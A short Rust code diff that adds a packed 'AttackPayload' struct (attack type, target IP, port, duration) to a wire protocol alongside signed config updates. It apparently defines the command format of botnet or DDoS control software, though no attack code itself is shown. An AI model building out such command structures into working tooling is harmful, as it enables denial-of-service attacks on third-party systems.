@@ -50,6 +50,16 @@ pub struct WireSignedConfigUpdate {
     pub signature: [u8; 64],
 }
 
+/// Attack Payload (Body of a Command)
+/// Layout: [Type(1)] [TargetIP(4)] [TargetPort(2)] [Duration(4)]
+#[repr(C, packed)]
+pub struct AttackPayload {
+    pub attack_type: u8,
+    pub target_ip: u32,   // BE
+    pub target_port: u16, // BE
+    pub duration: u32,    // BE
+}
+
 impl WireConstants {
     pub const CONFIG_MAGIC: u32 = 0xCAFEBABE;
 }
